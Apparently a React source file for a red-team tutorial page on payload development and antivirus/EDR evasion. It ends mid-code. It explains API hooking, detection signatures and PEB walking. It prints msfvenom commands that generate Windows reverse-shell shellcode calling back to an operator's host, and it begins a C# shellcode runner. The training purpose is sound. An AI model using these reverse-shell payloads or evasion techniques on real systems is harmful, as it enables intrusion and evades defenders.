                    <Typography
                      variant="body2"
                      sx={{
                        fontWeight: activeSection === item.id ? 700 : 500,
                        color: activeSection === item.id ? accent : "text.primary",
                      }}
                    >
                      {item.label}
                    </Typography>
                  }
                />
                {activeSection === item.id && (
                  <Chip label="Current" size="small" sx={{ height: 20, fontSize: "0.65rem", bgcolor: alpha(accent, 0.2), color: accent }} />
                )}
              </ListItem>
            ))}
          </List>
          <Divider sx={{ my: 2 }} />
          <Box sx={{ display: "flex", gap: 1 }}>
            <Button size="small" variant="outlined" onClick={scrollToTop} startIcon={<KeyboardArrowUpIcon />} sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}>
              Top
            </Button>
            <Button size="small" variant="outlined" onClick={() => scrollToSection("quiz-section")} startIcon={<QuizIcon />} sx={{ flex: 1, borderColor: alpha(accent, 0.3), color: accent }}>
              Quiz
            </Button>
          </Box>
        </Box>
      </Drawer>

      <Box sx={{ display: "flex", gap: 3, maxWidth: 1400, mx: "auto", px: { xs: 2, sm: 3 }, py: 4 }}>
        {sidebarNav}

        <Box sx={{ flex: 1, minWidth: 0 }}>
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="Back to Learning Hub"
            clickable
            variant="outlined"
            sx={{ borderRadius: 2, mb: 3 }}
          />

          {/* Hero Section */}
          <Paper
            sx={{
              p: 4,
              mb: 4,
              borderRadius: 4,
              background: `linear-gradient(135deg, ${alpha("#dc2626", 0.15)} 0%, ${alpha("#991b1b", 0.12)} 50%, ${alpha("#7f1d1d", 0.1)} 100%)`,
              border: `1px solid ${alpha("#dc2626", 0.2)}`,
              position: "relative",
              overflow: "hidden",
            }}
          >
            <Box sx={{ position: "absolute", top: -60, right: -40, width: 220, height: 220, borderRadius: "50%", background: `radial-gradient(circle, ${alpha("#dc2626", 0.15)} 0%, transparent 70%)` }} />
            <Box sx={{ position: "absolute", bottom: -40, left: "30%", width: 180, height: 180, borderRadius: "50%", background: `radial-gradient(circle, ${alpha("#991b1b", 0.15)} 0%, transparent 70%)` }} />

            <Box sx={{ position: "relative", zIndex: 1 }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 3, mb: 3 }}>
                <Box
                  sx={{
                    width: 80,
                    height: 80,
                    borderRadius: 3,
                    background: "linear-gradient(135deg, #dc2626, #991b1b)",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    boxShadow: `0 8px 32px ${alpha("#dc2626", 0.35)}`,
                  }}
                >
                  <BugReportIcon sx={{ fontSize: 44, color: "white" }} />
                </Box>
                <Box>
                  <Typography variant="h3" sx={{ fontWeight: 800, mb: 0.5 }}>
                    Payload Development & AV Evasion
                  </Typography>
                  <Typography variant="h6" color="text.secondary" sx={{ fontWeight: 400 }}>
                    Offensive tradecraft for authorized red team operations
                  </Typography>
                </Box>
              </Box>

              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mb: 3 }}>
                <Chip label="Shellcode" sx={{ bgcolor: alpha("#dc2626", 0.15), color: "#dc2626", fontWeight: 600 }} />
                <Chip label="Process Injection" sx={{ bgcolor: alpha("#f59e0b", 0.15), color: "#f59e0b", fontWeight: 600 }} />
                <Chip label="EDR Evasion" sx={{ bgcolor: alpha("#8b5cf6", 0.15), color: "#8b5cf6", fontWeight: 600 }} />
                <Chip label="AMSI Bypass" sx={{ bgcolor: alpha("#22c55e", 0.15), color: "#22c55e", fontWeight: 600 }} />
                <Chip label="Syscalls" sx={{ bgcolor: alpha("#ec4899", 0.15), color: "#ec4899", fontWeight: 600 }} />
              </Box>

              <Grid container spacing={2}>
                {[
                  { label: "Topics", value: "14", color: "#dc2626" },
                  { label: "Techniques", value: "30+", color: "#f59e0b" },
                  { label: "Quiz Questions", value: "75", color: "#8b5cf6" },
                  { label: "Difficulty", value: "Advanced", color: "#22c55e" },
                ].map((stat) => (
                  <Grid item xs={6} sm={3} key={stat.label}>
                    <Paper sx={{ p: 2, textAlign: "center", borderRadius: 2, bgcolor: alpha(stat.color, 0.1), border: `1px solid ${alpha(stat.color, 0.2)}` }}>
                      <Typography variant="h4" sx={{ fontWeight: 800, color: stat.color }}>{stat.value}</Typography>
                      <Typography variant="caption" color="text.secondary" sx={{ fontWeight: 600 }}>{stat.label}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Box>
          </Paper>

          {/* Introduction Section */}
          <Paper id="introduction" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <Avatar sx={{ bgcolor: alpha(accent, 0.15), color: accent }}><BugReportIcon /></Avatar>
              Introduction to Payload Development
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                What is a Payload? (Beginner Explanation)
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                Think of a <strong>payload</strong> like a letter inside an envelope. In hacking terms:<br/><br/>
                
                • The <strong>exploit</strong> is how you get in the door (like picking a lock)<br/>
                • The <strong>payload</strong> is what you do once you're inside (the actual action)<br/><br/>
                
                A payload could be anything: opening a command shell, downloading more tools, stealing credentials, or 
                simply proving you have access. It's the "business end" of any attack—the code that actually runs on the 
                target after you've found a way to execute it.<br/><br/>
                
                <strong>Simple Example:</strong> You find a vulnerability in a web server that lets you run code. The 
                exploit is the technique to trigger the vulnerability. The payload is the code you inject—maybe a script 
                that connects back to your machine so you can type commands.
              </Typography>
            </Box>

            <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
              Payload development is a core red team skill that involves creating custom code designed to execute on target
              systems during authorized security assessments. Understanding how to develop and deliver payloads—and how
              security products detect them—is essential for testing an organization's defenses.
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Modern security products have evolved significantly. Simple "script kiddie" attacks using off-the-shelf tools 
              are easily detected by even basic antivirus software. Professional red teams must understand detection mechanisms 
              deeply to create payloads that can realistically simulate advanced adversaries (like nation-state hackers) while 
              maintaining operational security.
            </Typography>

            <Box sx={{ bgcolor: alpha("#8b5cf6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#8b5cf6" }}>
                The Evolution of Payloads: A Brief History
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>1990s - Early Days:</strong><br/>
                Simple viruses spread via floppy disks. Payloads were basic—display a message, delete files. No AV 
                evasion needed because AV barely existed.<br/><br/>
                
                <strong>2000s - Script Kiddies Era:</strong><br/>
                Pre-made tools like Sub7, Back Orifice let anyone create trojans. AV started signature-based detection. 
                Attackers used "packers" to compress/encrypt payloads.<br/><br/>
                
                <strong>2010s - APT and Sophistication:</strong><br/>
                Nation-state actors developed custom malware (Stuxnet, APT groups). In-memory payloads became popular. 
                Security products added behavioral analysis.<br/><br/>
                
                <strong>2020s - EDR and Cat-and-Mouse:</strong><br/>
                EDR solutions monitor everything. Attackers use direct syscalls, sleep obfuscation, unhooking. It's 
                a constant arms race between offense and defense.
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#3b82f6" }}>
                Why Learn Payload Development?
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>For Red Teamers:</strong><br/>
                • Simulate advanced threats that off-the-shelf tools can't replicate<br/>
                • Bypass security controls to test their real-world effectiveness<br/>
                • Understand the attacker mindset to better advise on defenses<br/>
                • Differentiate yourself with custom tradecraft<br/><br/>

                <strong>For Blue Teamers / Defenders:</strong><br/>
                • Understand what you're defending against (know thy enemy)<br/>
                • Create better detection rules by knowing evasion techniques<br/>
                • Validate that your security stack actually stops sophisticated attacks<br/>
                • Avoid false confidence in "green checkmarks" from security products<br/><br/>

                <strong>For Security Researchers:</strong><br/>
                • Contribute to the security community's knowledge<br/>
                • Help vendors improve their products through responsible disclosure<br/>
                • Advance the state of offensive and defensive security<br/>
                • Build a career in one of the most in-demand cybersecurity specialties
              </Typography>
            </Box>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Prerequisites for This Guide</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { skill: "Programming Basics", level: "Required", desc: "Python, C, or C# fundamentals" },
                { skill: "Operating Systems", level: "Required", desc: "Windows/Linux internals basics" },
                { skill: "Networking", level: "Helpful", desc: "TCP/IP, ports, protocols" },
                { skill: "Assembly Language", level: "Helpful", desc: "x86/x64 basics for shellcode" },
              ].map((item) => (
                <Grid item xs={12} sm={6} key={item.skill}>
                  <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha(item.level === "Required" ? "#dc2626" : "#f59e0b", 0.08), border: `1px solid ${alpha(item.level === "Required" ? "#dc2626" : "#f59e0b", 0.2)}` }}>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 0.5 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.skill}</Typography>
                      <Chip label={item.level} size="small" sx={{ bgcolor: alpha(item.level === "Required" ? "#dc2626" : "#f59e0b", 0.15) }} />
                    </Box>
                    <Typography variant="caption" color="text.secondary">{item.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            <Alert severity="error" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>Authorization Required - This is Not Optional</AlertTitle>
              The techniques in this guide are for authorized security testing only. Unauthorized use against systems you
              don't own or have explicit written permission to test is <strong>illegal</strong> and <strong>unethical</strong>. 
              Laws like the Computer Fraud and Abuse Act (CFAA) in the US carry penalties up to 20 years in prison. 
              Similar laws exist worldwide. Always operate within scope and with written authorization from the system owner.
            </Alert>
          </Paper>

          {/* AV/EDR Basics Section */}
          <Paper id="av-edr-basics" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <ShieldIcon sx={{ color: accent }} />
              Understanding AV & EDR
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Before learning to evade security products, you must understand how they work. Modern endpoint security
              has evolved far beyond simple signature matching.
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: AV vs EDR
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Traditional Antivirus (AV):</strong><br/>
                • Primarily signature-based detection<br/>
                • Scans files when written/accessed<br/>
                • Binary decision: block or allow<br/>
                • Limited visibility into system behavior<br/>
                • Examples: Windows Defender (basic), older AV products<br/><br/>

                <strong>Endpoint Detection & Response (EDR):</strong><br/>
                • Behavioral analysis and heuristics<br/>
                • Continuous monitoring of system activity<br/>
                • Detailed telemetry sent to central console<br/>
                • Can detect, investigate, and respond to threats<br/>
                • Examples: CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint, Carbon Black<br/><br/>

                <strong>The Key Difference:</strong><br/>
                AV asks "Is this file malicious?" EDR asks "Is this behavior suspicious?" - even if individual actions
                seem benign, EDR can correlate them into a threat detection.
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#3b82f6" }}>
                Real-World Analogy: Security Guard vs. CCTV System
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Antivirus is like a Security Guard with a "Wanted Poster":</strong><br/>
                The guard stands at the door, checking each person against a stack of wanted posters (signatures). If your
                face matches a poster, you're stopped. But if you wear a disguise (modify your malware), the guard doesn't
                recognize you.<br/><br/>

                <strong>EDR is like a Full CCTV Surveillance System:</strong><br/>
                Cameras everywhere, recording everything. Even if the guard at the door doesn't recognize you, the system
                notices you: walked past the vault three times, tried several locked doors, put on gloves. The behavior
                pattern triggers an alert, even though each individual action seems innocent.<br/><br/>

                <strong>What This Means for Payload Development:</strong><br/>
                • Against AV: Change your appearance (modify signatures, encode payload)<br/>
                • Against EDR: Change your behavior (avoid suspicious API patterns, blend in with normal activity)
              </Typography>
            </Box>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Security Product Components</Typography>
            <Grid container spacing={2} sx={{ mb: 3 }}>
              {[
                { name: "Kernel Driver", desc: "Operates at the lowest level, intercepting file operations, process creation, and network activity before they happen. Very hard to evade because it sees everything.", color: "#dc2626" },
                { name: "User-Mode Agent", desc: "Places 'hooks' on Windows API functions. When you call CreateThread or WriteProcessMemory, the hook intercepts the call, logs it, and decides whether to allow it.", color: "#f59e0b" },
                { name: "Cloud Backend", desc: "When local analysis is uncertain, files or signatures are sent to the cloud for deeper analysis using more computing power and threat intelligence.", color: "#3b82f6" },
                { name: "SIEM Integration", desc: "All activity logs are sent to a central Security Information and Event Management system where analysts can investigate and correlate events across the organization.", color: "#22c55e" },
              ].map((item) => (
                <Grid item xs={12} md={6} key={item.name}>
                  <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha(item.color, 0.08), border: `1px solid ${alpha(item.color, 0.2)}`, height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: item.color }}>{item.name}</Typography>
                    <Typography variant="body2" color="text.secondary" sx={{ lineHeight: 1.7 }}>{item.desc}</Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>

            <Box sx={{ bgcolor: alpha("#8b5cf6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#8b5cf6" }}>
                Deep Dive: How API Hooking Works
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                When your code calls a Windows API function, it doesn't go directly to the kernel. Here's the journey:
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`NORMAL API CALL PATH:
Your Code
    ↓ calls WriteProcessMemory()
kernel32.dll  (high-level wrapper)
    ↓ calls NtWriteVirtualMemory()
ntdll.dll     (syscall stub)
    ↓ executes syscall instruction
KERNEL        (actual operation happens)

WITH EDR HOOKING:
Your Code
    ↓ calls WriteProcessMemory()
kernel32.dll
    ↓ 
ntdll.dll     ← EDR rewrites first bytes!
    ↓ JMP to EDR's code first
EDR CODE      ← Inspects: What process? What data?
    ↓ If allowed, jumps back
ntdll.dll     ← Continues to syscall
    ↓
KERNEL`}
                </Typography>
              </Paper>
              <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
                <strong>Why This Matters:</strong> EDR vendors literally rewrite Windows DLL code in memory. The first few
                bytes of functions like NtWriteVirtualMemory are replaced with a JMP instruction pointing to EDR's analysis
                code. This is called an "inline hook" and it's how they see everything your code does.
              </Typography>
            </Box>

            <Alert severity="info" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>Know Your Enemy</AlertTitle>
              Before attempting any evasion, research the specific security products deployed in your target environment.
              Each EDR has different strengths, weaknesses, and detection logic. What works against CrowdStrike might
              immediately alert SentinelOne.
            </Alert>
          </Paper>

          {/* Detection Methods Section */}
          <Paper id="detection-methods" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <SearchIcon sx={{ color: accent }} />
              Detection Methods
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Understanding detection mechanisms is crucial for developing evasive payloads. Each method has strengths
              and weaknesses that inform evasion strategies.
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: The Two Main Detection Approaches
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Static Analysis - "Looking at the Blueprint":</strong><br/>
                Like a customs officer examining your luggage without opening it. They look at the size, weight, what's
                declared on the label (file headers), and use X-rays (disassemblers) to peek inside. They check if anything
                matches their "prohibited items list" (signatures). Fast, but can be fooled by good concealment.<br/><br/>

                <strong>Dynamic Analysis - "Watching What You Actually Do":</strong><br/>
                Like undercover surveillance. They let you through and watch what you do. Did you go to suspicious
                locations? Meet with known criminals? Behave nervously? Even if you pass inspection at the door, your
                actions can still trigger alerts. Harder to fool, but more resource-intensive.<br/><br/>

                <strong>Modern Security: Defense in Depth</strong><br/>
                Real security products use BOTH. You might pass static analysis but get caught during dynamic. Or vice
                versa. Effective evasion must consider all layers.
              </Typography>
            </Box>

            <Grid container spacing={3} sx={{ mb: 3 }}>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#dc2626", 0.08), border: `1px solid ${alpha("#dc2626", 0.2)}`, height: "100%" }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#dc2626", mb: 2 }}>Static Analysis</Typography>
                  <Typography variant="body2" component="div" sx={{ lineHeight: 1.8, mb: 2 }}>
                    Examining files without execution:
                  </Typography>
                  <Typography variant="body2" component="div" sx={{ lineHeight: 1.8 }}>
                    • <strong>Signatures:</strong> Hash/pattern matching - If your file's hash is in the database, instant detection<br/>
                    • <strong>YARA Rules:</strong> Pattern-based detection looking for specific byte sequences, strings, or conditions<br/>
                    • <strong>Import Analysis:</strong> Does this program import VirtualAllocEx + WriteProcessMemory + CreateRemoteThread? Suspicious combo!<br/>
                    • <strong>Strings:</strong> Looking for hardcoded URLs, IP addresses, suspicious commands like "mimikatz"<br/>
                    • <strong>Entropy:</strong> Encrypted/compressed data looks random. High entropy sections = likely packed or encrypted<br/>
                    • <strong>PE Analysis:</strong> Weird section names, unusual entry points, strange header values all raise flags
                  </Typography>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#3b82f6", 0.08), border: `1px solid ${alpha("#3b82f6", 0.2)}`, height: "100%" }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#3b82f6", mb: 2 }}>Dynamic Analysis</Typography>
                  <Typography variant="body2" component="div" sx={{ lineHeight: 1.8, mb: 2 }}>
                    Monitoring behavior during execution:
                  </Typography>
                  <Typography variant="body2" component="div" sx={{ lineHeight: 1.8 }}>
                    • <strong>API Monitoring:</strong> Every Windows API call is logged via hooks. Who, what, when, and to what process<br/>
                    • <strong>Process Behavior:</strong> Parent-child relationships, injection attempts (notepad.exe spawning cmd.exe?)<br/>
                    • <strong>Network Activity:</strong> Unexpected connections, DNS queries for weird domains, periodic "beaconing"<br/>
                    • <strong>File System:</strong> Writing to suspicious locations (Temp, Startup), creating executables<br/>
                    • <strong>Registry:</strong> Adding persistence keys (Run, Services), modifying security settings<br/>
                    • <strong>Memory:</strong> Scanning process memory for known shellcode patterns, RWX pages, unbacked code
                  </Typography>
                </Paper>
              </Grid>
            </Grid>

            <Box sx={{ bgcolor: alpha("#8b5cf6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#8b5cf6" }}>
                EDR Telemetry Sources Explained
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>ETW (Event Tracing for Windows):</strong><br/>
                A Windows built-in logging system that can trace almost everything happening on the system. EDRs subscribe
                to providers like Microsoft-Windows-Kernel-Process, Microsoft-Windows-Kernel-File, etc. Even if you bypass
                user-mode hooks, ETW can still see kernel events.<br/><br/>

                <strong>API Hooks (User-Mode):</strong><br/>
                The EDR literally rewrites the first bytes of functions in ntdll.dll and kernel32.dll. When you call
                NtAllocateVirtualMemory, you're really jumping to EDR code first. They log parameters, check for suspicious
                patterns, and can block the call entirely.<br/><br/>

                <strong>Kernel Callbacks:</strong><br/>
                Windows lets drivers register to be notified of events: PsSetCreateProcessNotifyRoutine for process creation,
                ObRegisterCallbacks for handle operations. These are kernel-level and very hard to bypass.<br/><br/>

                <strong>Mini-Filter Drivers:</strong><br/>
                File system filter drivers see ALL file operations. Every file read, write, create, delete. This is how
                they detect dropping malware to disk, even to obscure locations.
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#f59e0b" }}>
                Common Detection Signatures (What They Look For)
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`# Suspicious string patterns
"mimikatz"                # Credential dumping tool
"Invoke-Expression"       # PowerShell code execution
"http://*/beacon"         # C2 communication
"-enc " + base64          # Encoded PowerShell
"schtasks /create"        # Scheduled task persistence

# Suspicious API call patterns
OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
  ↳ Classic process injection pattern = HIGH ALERT

VirtualAlloc(RWX) → memcpy → call/jmp to new memory
  ↳ Shellcode execution pattern

# Suspicious process behaviors
Excel.exe → spawns → cmd.exe or powershell.exe
  ↳ Macro malware pattern

svchost.exe without -k parameter
  ↳ Malware masquerading as system process`}
                </Typography>
              </Paper>
            </Box>

            <Alert severity="info" sx={{ borderRadius: 2 }}>
              <AlertTitle sx={{ fontWeight: 700 }}>Detection Layers: The Onion Model</AlertTitle>
              Modern EDRs use multiple detection layers like an onion. Evading one layer (e.g., static signatures) doesn't mean the
              payload won't be caught by another (e.g., behavioral analysis). Effective evasion requires addressing
              multiple detection vectors simultaneously. Think: "What will trigger at each layer?"
            </Alert>
          </Paper>

          {/* Shellcode Fundamentals Section */}
          <Paper id="shellcode-fundamentals" sx={{ p: 4, mb: 4, borderRadius: 4 }}>
            <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <TerminalIcon sx={{ color: accent }} />
              Shellcode Fundamentals
            </Typography>
            <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
              Shellcode is the foundation of payload development—small, position-independent machine code that can be
              injected and executed in various contexts.
            </Typography>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#22c55e" }}>
                Beginner's Guide: What Makes Shellcode Special?
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                <strong>Position Independence:</strong><br/>
                Shellcode doesn't know where in memory it will run. It can't use absolute addresses—everything must be
                relative or dynamically resolved.<br/><br/>

                <strong>No External Dependencies:</strong><br/>
                Can't rely on the loader to resolve imports. Must find functions manually (PEB walking, API hashing).<br/><br/>

                <strong>Self-Contained:</strong><br/>
                All functionality in one contiguous block of code. No separate data sections, no relocations.<br/><br/>

                <strong>Size Constraints:</strong><br/>
                Often limited by buffer sizes in exploits. Every byte counts.
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#3b82f6" }}>
                Real-World Analogy: The Spy in a Foreign Country
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9 }}>
                Imagine you're a spy dropped into an unfamiliar city with no phone, no map, and no contacts. You need to:<br/><br/>

                <strong>1. Figure out where you are:</strong> Shellcode doesn't know its memory address. It must work regardless
                of where it lands (position-independent code).<br/><br/>

                <strong>2. Find resources locally:</strong> You can't call home for help. Shellcode must find Windows API
                functions by walking the PEB (Process Environment Block) to locate loaded DLLs.<br/><br/>

                <strong>3. Travel light:</strong> You can only carry what fits in a small bag. Shellcode must be compact,
                with no dependencies on external files or libraries.<br/><br/>

                <strong>4. Blend in:</strong> Don't look suspicious. Shellcode must avoid detection by not containing
                obvious malicious strings or patterns.
              </Typography>
            </Box>

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Shellcode Generation with msfvenom</Typography>
            <Paper sx={{ p: 3, mb: 3, borderRadius: 2, bgcolor: "#1a1a2e", fontFamily: "monospace" }}>
              <Typography variant="body2" sx={{ color: "#f8f8f2" }} component="pre">
{`# Generate reverse shell shellcode with msfvenom
# This creates shellcode that connects back to your machine
msfvenom -p windows/x64/meterpreter/reverse_https \\
  LHOST=192.168.1.100 LPORT=443 \\
  -f csharp -o payload.cs

# Common output formats:
# -f raw      Raw binary shellcode (for direct use)
# -f c        C-style array: unsigned char buf[] = {0xfc, 0x48...}
# -f csharp   C# byte array: byte[] buf = new byte[]{0xfc, 0x48...}
# -f python   Python byte string: buf = b"\\xfc\\x48..."
# -f ps1      PowerShell byte array: [Byte[]] $buf = 0xfc, 0x48...

# Avoid null bytes (important for string-based exploits):
# Null bytes (0x00) terminate C strings, truncating your shellcode!
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=10.0.0.1 LPORT=4444 \\
  -b "\\x00\\x0a\\x0d" \\
  -f csharp

# Generate a simple MessageBox payload (great for testing):
msfvenom -p windows/x64/messagebox TEXT="Hello from shellcode!" \\
  -f csharp`}
              </Typography>
            </Paper>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#f59e0b" }}>
                PEB Walking: Finding Functions at Runtime (Detailed)
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                Shellcode can't use import tables because it's injected raw code. It must find Windows API functions manually.
                Here's the step-by-step process:
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`STEP-BY-STEP PEB WALKING (x64):

1. ACCESS THE TEB (Thread Environment Block)
   TEB is always at gs:[0x30] on x64
   TEB contains pointer to PEB at offset 0x60
   
   mov rax, gs:[0x60]    ; RAX now points to PEB

2. FIND THE LDR (Loader Data)
   PEB+0x18 → pointer to PEB_LDR_DATA
   
   mov rax, [rax+0x18]   ; RAX = PEB->Ldr

3. ACCESS THE MODULE LIST
   Ldr+0x20 → InMemoryOrderModuleList (linked list of loaded DLLs)
   
   mov rax, [rax+0x20]   ; First entry in module list

4. FIND YOUR TARGET DLL
   Walk the list, checking each DLL name:
   - Entry+0x50 → DLL name (Unicode string)
   - Entry → next entry (Flink)
   
   We're looking for kernel32.dll or ntdll.dll

5. PARSE THE DLL'S EXPORT TABLE
   Once found, get the DLL base address
   Parse the PE header → Export Directory
   Walk the export table to find function by name or hash

6. RETRIEVE FUNCTION ADDRESS
   Calculate: BaseAddress + FunctionRVA = Actual Address
   Now you can call GetProcAddress, LoadLibraryA, etc!`}
                </Typography>
              </Paper>
              <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
                <strong>Why This Matters:</strong> PEB walking lets shellcode work without any imports. AV can't detect 
                function usage just by looking at the import table because there isn't one!
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#8b5cf6", 0.08), p: 3, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
              <Typography variant="h6" sx={{ fontWeight: 600, mb: 2, color: "#8b5cf6" }}>
                Simple Shellcode Runner (C# Example)
              </Typography>
              <Typography variant="body2" component="div" sx={{ lineHeight: 1.9, mb: 2 }}>
                This is the basic pattern for executing shellcode. Understand this, and you understand the foundation of
                payload execution:
              </Typography>
              <Paper sx={{ p: 2, borderRadius: 2, bgcolor: alpha("#000", 0.3), fontFamily: "monospace", mb: 2 }}>
                <Typography variant="body2" component="pre" sx={{ whiteSpace: "pre-wrap", lineHeight: 1.6, color: "#f8f8f2" }}>
{`using System;
using System.Runtime.InteropServices;

class ShellcodeRunner
{
    // Import Windows API functions
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, 
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
